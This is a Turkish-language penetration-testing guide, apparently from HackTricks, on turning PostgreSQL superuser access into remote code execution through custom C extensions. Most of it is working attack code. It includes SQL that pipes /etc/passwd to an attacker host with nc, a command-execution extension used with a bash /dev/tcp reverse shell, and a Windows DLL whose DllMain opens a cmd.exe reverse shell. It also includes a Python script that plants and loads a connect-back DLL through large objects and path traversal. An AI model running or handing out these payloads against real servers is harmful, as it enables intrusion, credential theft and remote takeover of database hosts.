# PostgreSQL Uzantıları

<details>

<summary><strong>AWS hacklemeyi sıfırdan ileri seviyeye öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin **HackTricks'te reklamını görmek ister misiniz**? veya **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz**? [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak [hacktricks repo'ya](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo'ya](https://github.com/carlospolop/hacktricks-cloud) PR gönderin.**

</details>

PostgreSQL, uzantıları sanki bunlar yerleşik işlevlermiş gibi sorunsuz bir şekilde entegre edebilmesine olanak tanıyan genişletilebilirlik özelliğiyle geliştirilmiştir. Bu uzantılar, temelde C dilinde yazılmış kütüphaneler olup veritabanını ek fonksiyonlar, operatörler veya tiplerle zenginleştirir.

8.1 sürümünden itibaren uzantı kütüphaneleri için belirli bir gereklilik bulunmaktadır: özel bir başlıkla derlenmiş olmaları gerekmektedir. Bu olmadan PostgreSQL bunları yürütmez, yalnızca uyumlu ve potansiyel olarak güvenli uzantıların kullanılmasını sağlar.

Ayrıca, **PostgreSQL'i istismar ederek kurbanın sistemine dosya yüklemeyi bilmiyorsanız** [**bu yazıyı okumalısınız.**](big-binary-files-upload-postgresql.md)

### Linux'ta RCE

**Daha fazla bilgi için: [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)**

PostgreSQL 8.1 ve daha eski sürümlerinden sistem komutlarının yürütülmesi belgelenmiş ve basit bir süreçtir. Bu şu şekilde kullanılabilir: [Metasploit modülü](https://www.rapid7.com/db/modules/exploit/linux/postgres/postgres_payload).
```sql
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');

# You can also create functions to open and write files
CREATE OR REPLACE FUNCTION open(cstring, int, int) RETURNS int AS '/lib/libc.so.6', 'open' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION write(int, cstring, int) RETURNS int AS '/lib/libc.so.6', 'write' LANGUAGE 'C' STRICT;
CREATE OR REPLACE FUNCTION close(int) RETURNS int AS '/lib/libc.so.6', 'close' LANGUAGE 'C' STRICT;
```
<details>

<summary>Base64'dan ikili dosya yazma</summary>

Postgres'te bir dosyaya ikili veri yazmak için base64 kullanmanız gerekebilir, bu durumda aşağıdaki yöntem işinize yarayabilir:
```sql
CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
$$
DECLARE
fh int;
s int;
w bytea;
i int;
BEGIN
SELECT open(textout(file)::cstring, 522, 448) INTO fh;

IF fh <= 2 THEN
RETURN 1;
END IF;

SELECT decode(s, 'base64') INTO w;

i := 0;
LOOP
EXIT WHEN i >= octet_length(w);

SELECT write(fh,textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;

IF rs < 0 THEN
RETURN 2;
END IF;

i := i + 1;
END LOOP;

SELECT close(fh) INTO rs;

RETURN 0;

END;
$$ LANGUAGE 'plpgsql';
```
</details>

Ancak, daha büyük sürümlerde denendiğinde **aşağıdaki hata görüntülendi**:
```c
ERROR:  incompatible library “/lib/x86_64-linux-gnu/libc.so.6”: missing magic block
HINT:  Extension libraries are required to use the PG_MODULE_MAGIC macro.
```
Bu hata, [PostgreSQL belgelerinde](https://www.postgresql.org/docs/current/static/xfunc-c.html) açıklanmıştır:

> Bir dinamik olarak yüklenen nesne dosyasının uyumsuz bir sunucuya yüklenmemesini sağlamak için PostgreSQL, dosyanın uygun içeriğe sahip bir "büyülü blok" içerdiğini kontrol eder. Bu, sunucunun, PostgreSQL'nin farklı bir ana sürümü için derlenmiş bir kod gibi açık uyumsuzlukları tespit etmesine olanak tanır. PostgreSQL 8.2'den itibaren bir büyülü blok gereklidir. Bir büyülü blok eklemek için, başlık fmgr.h dahil edildikten sonra modül kaynak dosyalarından birinde şunu yazın:
>
> `#ifdef PG_MODULE_MAGIC`\
> `PG_MODULE_MAGIC;`\
> `#endif`

PostgreSQL sürüm 8.2'den itibaren, saldırganın sistemi istismar etmek için izlemesi gereken süreç daha zor hale getirilmiştir. Saldırganın ya zaten sistemde bulunan bir kütüphaneyi kullanması ya da özel bir kütüphane yüklemesi gerekmektedir. Bu özel kütüphane, PostgreSQL'nin uyumlu ana sürümüne karşı derlenmiş olmalı ve belirli bir "büyülü blok" içermelidir. Bu önlem, PostgreSQL sistemlerini istismar etmenin zorluğunu önemli ölçüde artırır, çünkü sistem mimarisinin ve sürüm uyumluluğunun daha derin bir anlayışını gerektirir.

#### Kütüphaneyi Derle

PostgreSQL sürümünü alın:
```sql
SELECT version();
PostgreSQL 9.6.3 on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18) 6.3.0 20170516, 64-bit
```
Uyumluluk için, ana sürümlerin hizalanması önemlidir. Bu nedenle, 9.6.x serisi içinde herhangi bir sürümle bir kütüphaneyi derlemek başarılı entegrasyonu sağlamalıdır.


Bu sürümü sisteminize kurmak için:
```bash
apt install postgresql postgresql-server-dev-9.6
```
Ve kütüphaneyi derleyin:
```c
//gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
char* command = PG_GETARG_CSTRING(0);
PG_RETURN_INT32(system(command));
}
```
Ardından derlenmiş kütüphaneyi yükleyin ve şu komutları yürütün:
```bash
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
#Notice the double single quotes are needed to scape the qoutes
```
Bu **kütüphane önceden derlenmiş** birkaç farklı PostgreSQL sürümüne ve hatta şu adresten (eğer PostgreSQL erişiminiz varsa) **bu işlemi otomatikleştirebilirsiniz**:

{% embed url="https://github.com/Dionach/pgexec" %}

### Windows'ta Uzaktan Kod Çalıştırma (RCE)

Aşağıdaki DLL, **binary dosyasının adını** ve **çalıştırmak istediğiniz** **kez sayısını** girdi olarak alır ve çalıştırır:
```c
#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <stdio.h>
#include "utils/builtins.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum pgsql_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(pgsql_exec);

/* this function launches the executable passed in as the first parameter
in a FOR loop bound by the second parameter that is also passed*/
Datum
pgsql_exec(PG_FUNCTION_ARGS)
{
/* convert text pointer to C string */
#define GET_STR(textp) DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))

/* retrieve the second argument that is passed to the function (an integer)
that will serve as our counter limit*/

int instances = PG_GETARG_INT32(1);

for (int c = 0; c < instances; c++) {
/*launch the process passed in the first parameter*/
ShellExecute(NULL, "open", GET_STR(PG_GETARG_TEXT_P(0)), NULL, NULL, 1);
}
PG_RETURN_VOID();
}
```
Bu zip dosyasında derlenmiş DLL'yi bulabilirsiniz:

{% file src="../../../.gitbook/assets/pgsql_exec.zip" %}

Bu DLL'ye **hangi ikili dosyanın yürütüleceğini** ve kaç kez yürütüleceğini belirtebilirsiniz, bu örnekte `calc.exe` 2 kez yürütülecektir:
```bash
CREATE OR REPLACE FUNCTION remote_exec(text, integer) RETURNS void AS '\\10.10.10.10\shared\pgsql_exec.dll', 'pgsql_exec' LANGUAGE C STRICT;
SELECT remote_exec('calc.exe', 2);
DROP FUNCTION remote_exec(text, integer);
```
[**burada**](https://zerosum0x0.blogspot.com/2016/06/windows-dll-to-shell-postgres-servers.html) bu ters kabuğu bulabilirsiniz:
```c
#define PG_REVSHELL_CALLHOME_SERVER "10.10.10.10"
#define PG_REVSHELL_CALLHOME_PORT "4444"

#include "postgres.h"
#include <string.h>
#include "fmgr.h"
#include "utils/geo_decls.h"
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

#pragma warning(push)
#pragma warning(disable: 4996)
#define _WINSOCK_DEPRECATED_NO_WARNINGS

BOOL WINAPI DllMain(_In_ HINSTANCE hinstDLL,
_In_ DWORD fdwReason,
_In_ LPVOID lpvReserved)
{
WSADATA wsaData;
SOCKET wsock;
struct sockaddr_in server;
char ip_addr[16];
STARTUPINFOA startupinfo;
PROCESS_INFORMATION processinfo;

char *program = "cmd.exe";
const char *ip = PG_REVSHELL_CALLHOME_SERVER;
u_short port = atoi(PG_REVSHELL_CALLHOME_PORT);

WSAStartup(MAKEWORD(2, 2), &wsaData);
wsock = WSASocket(AF_INET, SOCK_STREAM,
IPPROTO_TCP, NULL, 0, 0);

struct hostent *host;
host = gethostbyname(ip);
strcpy_s(ip_addr, sizeof(ip_addr),
inet_ntoa(*((struct in_addr *)host->h_addr)));

server.sin_family = AF_INET;
server.sin_port = htons(port);
server.sin_addr.s_addr = inet_addr(ip_addr);

WSAConnect(wsock, (SOCKADDR*)&server, sizeof(server),
NULL, NULL, NULL, NULL);

memset(&startupinfo, 0, sizeof(startupinfo));
startupinfo.cb = sizeof(startupinfo);
startupinfo.dwFlags = STARTF_USESTDHANDLES;
startupinfo.hStdInput = startupinfo.hStdOutput =
startupinfo.hStdError = (HANDLE)wsock;

CreateProcessA(NULL, program, NULL, NULL, TRUE, 0,
NULL, NULL, &startupinfo, &processinfo);

return TRUE;
}

#pragma warning(pop) /* re-enable 4996 */

/* Add a prototype marked PGDLLEXPORT */
PGDLLEXPORT Datum dummy_function(PG_FUNCTION_ARGS);

PG_FUNCTION_INFO_V1(add_one);

Datum dummy_function(PG_FUNCTION_ARGS)
{
int32 arg = PG_GETARG_INT32(0);

PG_RETURN_INT32(arg + 1);
}
```
Not aldatıcı kodun **DllMain fonksiyonu içinde** olduğuna dikkat edin. Bu durumda, postgresql'de yüklenen fonksiyonu çalıştırmak gerekli değildir, sadece **DLL yüklemek** ters kabuğu **çalıştıracaktır**:
```c
CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS '\\10.10.10.10\shared\dummy_function.dll', 'dummy_function' LANGUAGE C STRICT;
```
[PolyUDF projesi](https://github.com/rop-la/PolyUDF) aynı zamanda tam MS Visual Studio projesi ve _command eval_, _exec_ ve _cleanup_ içeren kullanıma hazır bir kütüphane ile çoklu sürüm desteği sunan iyi bir başlangıç noktasıdır.

### En yeni PostgreSQL sürümlerinde Uzaktan Kod Çalıştırma (RCE)

PostgreSQL'in **en son sürümlerinde**, `superuser`'ın belirli dizinlerden başka paylaşılan kütüphane dosyalarını yükleme işlemi **yasaklanmıştır**, örneğin Windows'ta `C:\Program Files\PostgreSQL\11\lib` veya \*nix sistemlerinde `/var/lib/postgresql/11/lib` gibi belirli dizinler. Bu dizinler yazma işlemlerine karşı NETWORK\_SERVICE veya postgres hesapları tarafından **korunmaktadır**.

Bu kısıtlamalara rağmen, kimlik doğrulaması yapılmış bir veritabanı `superuser`'ının "büyük nesneler" kullanarak dosya sistemine **biner dosyalar yazması mümkündür**. Bu yetenek, tabloları güncelleme veya oluşturma gibi veritabanı işlemleri için esas olan `C:\Program Files\PostgreSQL\11\data` dizinine yazma işlemine genişler.

Önemli bir zafiyet, dizin gezintisine izin veren `CREATE FUNCTION` komutundan kaynaklanmaktadır. Sonuç olarak, kimlik doğrulaması yapılmış bir saldırgan, bu gezintiyi kullanarak bir paylaşılan kütüphane dosyasını veri dizinine yazabilir ve ardından onu **yükleyebilir**. Bu saldırı, saldırganın sisteminde keyfi kod yürütmesine olanak tanır, böylece sistemde yerel kod yürütme sağlanır.

#### Saldırı akışı

İlk olarak, **dll dosyasını yüklemek için büyük nesneleri kullanmanız gerekir**. Bunu nasıl yapacağınızı buradan görebilirsiniz:

{% content-ref url="big-binary-files-upload-postgresql.md" %}
[big-binary-files-upload-postgresql.md](big-binary-files-upload-postgresql.md)
{% endcontent-ref %}

Veri dizinine uzantıyı (bu örnekte poc.dll adıyla) yükledikten sonra şunu kullanarak yükleyebilirsiniz:
```c
create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
select connect_back('192.168.100.54', 1234);
```
_Not: `.dll` uzantısını eklemenize gerek yok çünkü oluşturma işlevi bunu ekleyecektir._

Daha fazla bilgi için **orijinal yayını**[ **buradan okuyun**](https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html)**.**\
O yayında **bu, postgres uzantısını oluşturmak için kullanılan koddu**](https://github.com/sourceincite/tools/blob/master/pgpwn.c) (_bir postgres uzantısını derlemeyi öğrenmek için önceki sürümlerden herhangi birini okuyun_).\
Aynı sayfada bu **tekniği otomatikleştirmek için kullanılan** exploit verildi:
```python
#!/usr/bin/env python3
import sys

if len(sys.argv) != 4:
print("(+) usage %s <connectback> <port> <dll/so>" % sys.argv[0])
print("(+) eg: %s 192.168.100.54 1234 si-x64-12.dll" % sys.argv[0])
sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])
lib = sys.argv[3]
with open(lib, "rb") as dll:
d = dll.read()
sql = "select lo_import('C:/Windows/win.ini', 1337);"
for i in range(0, len(d)//2048):
start = i * 2048
end   = (i+1) * 2048
if i == 0:
sql += "update pg_largeobject set pageno=%d, data=decode('%s', 'hex') where loid=1337;" % (i, d[start:end].hex())
else:
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % (i, d[start:end].hex())
if (len(d) % 2048) != 0:
end   = (i+1) * 2048
sql += "insert into pg_largeobject(loid, pageno, data) values (1337, %d, decode('%s', 'hex'));" % ((i+1), d[end:].hex())

sql += "select lo_export(1337, 'poc.dll');"
sql += "create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;"
sql += "select connect_back('%s', %d);" % (host, port)
print("(+) building poc.sql file")
with open("poc.sql", "w") as sqlfile:
sqlfile.write(sql)
print("(+) run poc.sql in PostgreSQL using the superuser")
print("(+) for a db cleanup only, run the following sql:")
print("    select lo_unlink(l.oid) from pg_largeobject_metadata l;")
print("    drop function connect_back(text, integer);")
```
## Referanslar

* [https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)
* [https://www.exploit-db.com/papers/13084](https://www.exploit-db.com/papers/13084)

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te** görmek ister misiniz**? ya da **PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**. 

</details>
